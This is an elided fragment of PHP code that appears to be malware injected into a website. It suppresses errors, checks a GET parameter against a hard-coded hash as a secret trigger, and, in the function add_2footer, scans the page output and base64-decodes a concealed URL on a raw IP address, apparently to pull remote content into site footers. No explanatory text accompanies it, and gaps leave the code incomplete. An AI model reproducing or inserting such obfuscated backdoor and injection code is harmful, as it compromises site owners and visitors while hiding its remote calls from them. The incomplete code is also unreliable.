...
error_reporting(0);
$_passssword = 'fea42c5c183bd82cae9c01ef4e76eddb';
unset($_passssword);
...
function add_2footer() {
    $check = false;
    $check_data = "";
    if (!empty($_GET['check']) AND $_GET['check'] == 'fea42c5c183bd82cae9c01ef4e76eddb') {
        $check = true;
    ...
    if (preg_match($regexp, $buffer, $m)) {
        $body = $m[0];
        $url = base64_decode('aHR0cDovLzIxNy4xMi4yMDMuMTgyL2Jsb2cvP21lcmN1cnkmdXRtX3NvdXJjZT0zMzAxOTozMzkyOTQ6NTI1');
